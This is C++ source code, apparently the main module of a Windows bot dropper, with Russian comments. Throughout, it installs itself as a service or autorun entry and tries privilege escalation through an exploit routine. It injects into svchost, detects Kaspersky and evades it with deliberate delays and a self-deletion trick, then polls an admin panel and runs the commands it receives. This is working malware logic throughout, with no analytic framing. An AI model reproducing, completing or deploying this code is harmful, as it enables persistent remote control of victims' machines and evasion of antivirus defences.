#include "core\core.h"
#include "core\rand.h"
#include "core\injects.h"
#include "core\file.h"
#include "core\elevation.h"
#include "main.h"
#include "adminka.h"
#include "task.h"
#include "service.h"

//файл который нужно будет удалить после старта дроппера
char fileDropper[MAX_PATH];
//копирует дроппер в папку автозагрузки юзера
bool SetAutorun( StringBuilder& dropper );
//проверяет является ли дроппер автозагрузочным файлом
bool IsAutorun( StringBuilder& dropper );
//установка в автозагрузку
bool InstallBot( StringBuilder& path );
//возвращает true, если запущен касперский
bool IsPresentKAV();
//возвращает true если запущен дубликат бота, и в Config::state устанавливает флаг RUNNED_DUBLICATION
bool IsDuplication();
//работа с админкой
DWORD WINAPI MainLoop( void* );
DWORD WINAPI InstallBotThread( void* );

void main()
{
	if( !WinAPI::Init() ) return;
	if( !Core::Init() ) return;
	if( !Config::Init() ) return;
	Rand::Init();
	StringBuilder path( fileDropper, sizeof(fileDropper) );
	if( !Path::GetStartupExe(path) ) return;

	char paramUpdate[4];
	paramUpdate[0] = ' ';
	paramUpdate[1] = '-';
	paramUpdate[2] = 'u';
	paramUpdate[3] = 0;
	int posParam = 0;

	char* cmdLine = API(KERNEL32, GetCommandLineA)();
	int lenLine = Str::Len(cmdLine);

	if( (posParam = Str::IndexOf( cmdLine, paramUpdate, lenLine, sizeof(paramUpdate) - 1 )) > 0 ) //горячее обновление
	{
		DbgMsg( "Запустили обновление" );
		Delay(5000); //ждем пока старый закроется
		Config::state |= EXTERN_NAME_MANAGER | RUNNED_UPDATE;
		StartBot();
	}
	else 
	{
		//антиэмуляционная защита от КАВа
//		char path2[MAX_PATH];
//		API(KERNEL32, GetTempPathA)( MAX_PATH, path2 );
//		API(KERNEL32, CreateFileA)( path2, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0 );
//		if( API(KERNEL32, GetLastError)() == 3 )
		{
			IsDuplication();
			//смотрим является ли файл сервисом
			if( Service::IsService(path) )
			{
				if( (Config::state & RUNNED_DUBLICATION) == 0 )
				{
					fileDropper[0] = 0; //отключаем самоудаление
					Config::state |= IS_SERVICE;
					if( !Service::Start() )
						StartBot();
				}
			}
			else if( IsAutorun(path) ) //запустился из автозагрузки
			{
				if( (Config::state & RUNNED_DUBLICATION) == 0 )
				{
					fileDropper[0] = 0; //отключаем самоудаление
					StartBot();
				}
			}
			else //запущен дроппер
			{
				DbgMsg( "Запущен дроппер" );
				StringBuilderStack<MAX_PATH> exeSdrop = path;
				bool res = false;
#ifndef OFF_SDPROP
				if( IsPresentKAV() ) 
				{
					Config::state |= NOT_DIRECT_INJECT /*| NOT_USED_INJECT | NOT_INSTALL_SERVICE | NOT_INSTALL_AUTORUN*/; //для каспера отключаем прямой инжект
				}
				else
					if( (Config::state & SPLOYTY_OFF) == 0 )
						res = Elevation::Sdrop(0);
#endif
				if( res ) //пытаемся запустить дроппера с системными правами
				{
					DbgMsg( "Sdrop ok" );
				}
				else
				{
					DbgMsg( "Sdrop bad" );
				}
				StartBot();
			}
		}
	}

	API(KERNEL32, ExitProcess)(0);
}

bool StartBot()
{
	return JmpToSvchost2(MainLoop);
}

bool InstallBot( StringBuilder& path )
{
	//пытаемся установиться как сервис
#ifndef OFF_SERVICE 
	if( (Config::state & NOT_INSTALL_SERVICE) == 0 )
		if( Service::Install( path, false ) )
		{
			Config::state |= IS_SERVICE;
			return true;
		}
#endif
#ifndef OFF_AUTORUN
	//пытаемся стать в автозагрузку
	if( (Config::state & NOT_INSTALL_AUTORUN) == 0 )
		if( SetAutorun(path) )
			return true;
#endif
	return false;
}

DWORD WINAPI MainLoop( void* )
{
	if( !InitBot() ) return 0;

	if( !AdminPanel::Init() ) return 0;

	if( (Config::state & RUNNED_DUBLICATION)  )
	{
		if( fileDropper[0] )
			InstallBotThread(0); //запускаем чтобы сработало самоудаление
		return 0;
	}
	else
	{
		if( fileDropper[0] ) //был запущен дроппер
		{
			Config::fileNameBot[0] = 0; //чтобы не был заблокирован (защищен) дроппер
			RunThread( InstallBotThread, 0 ); //тут проводится установка для автозагрузки и следом удаляется бот
		}
		Task::Init();
		StringBuilder cmd(256);
		for(;;)
		{
			DbgMsg( "Запрос команды" );
			if( AdminPanel::GetCmd(cmd) )
			{
				Task::ExecCmd( cmd, cmd.Len() );
			}
			Delay(Config::waitPeriod);
		}
	}

	ReleaseBot();
	API(KERNEL32, ExitProcess)(0);
	return 0;
}

bool SetAutorun( StringBuilder& dropper )
{
	StringBuilderStack<MAX_PATH> autorun;
	Config::FullNameBotExe(autorun);
	Str::Copy( Config::fileNameBot, sizeof(Config::fileNameBot), autorun, autorun.Len() );
	DbgMsg( "Копируем в автозагрузку: %s", autorun );
	File::SetAttributes( autorun, FILE_ATTRIBUTE_NORMAL ); //если файл существует, то снимаем аттрибуты защиты, чтобы скопировался без проблем
	if( File::Copy( dropper, autorun ) )
	{
		DbgMsg( "Установка в автозагрузку прошла успешно" );
		File::SetAttributes( autorun, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
		return true;
	}
	else
		DbgMsg( "В автозагрузку не удалось установиться" );
	return false;
}

bool IsAutorun( StringBuilder& dropper )
{
	StringBuilderStack<32> name;
	Config::NameBotExe(name);
	int res = dropper.IndexOf(name);
	if( res >= 0 )
		return true;
	return false;
}

DWORD WINAPI InstallBotThread( void* )
{
	StringBuilder path( 0, sizeof(fileDropper), fileDropper );
	if( (Config::state & RUNNED_DUBLICATION) == 0 )
	{
		DbgMsg( "Запущен поток инсталяции" );
		Delay(5000); //немного ждем, иначе проактивная защита может сработать, если делать сразу
		//копируем заранее в файл сервиса, который потом будет подхвачен при инсталяции
		//такое необходимо из-за того что KAV палит копирование exe в системные папки, а в этом месте не палит
		if( (Config::state & NOT_INSTALL_SERVICE) == 0 )
			Service::Copy(path); 
		InstallBot(path);
	}
	for( int i = 0; i < 10; i++ )
	{
//бот удаляет через его переименование, если напрямую удалять, то палит КАV
//также KAV не ругается если просто обнулять файл
		DbgMsg( "Удаляем дроппер %s, попытка %d", fileDropper, i + 1 );

		HANDLE hfile = File::Open( fileDropper, GENERIC_WRITE, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE );
		if( hfile )
		{
			File::Close(hfile);
			DbgMsg( "Дроппер успешно удален" );
			break;
		}
		Delay(1000);
	}
	return 0;
}

bool IsPresentKAV()
{
	if( Process::GetPID( _CS_("avp.exe") ) ) return true;
	if( Process::GetPID( _CS_("avpui.exe") ) ) return true;
	return false;
}

bool IsDuplication()
{
	if( Config::state & CHECK_DUPLICATION )
	{
		if( Config::CreateMutex() )
			Config::ReleaseMutex(); //сразу освобождаем, захват произойдет позже
		else
		{
			Config::state |= RUNNED_DUBLICATION;
			DbgMsg( "Запущен дубликат" );
			return true;
		}
	}
	return false;
}
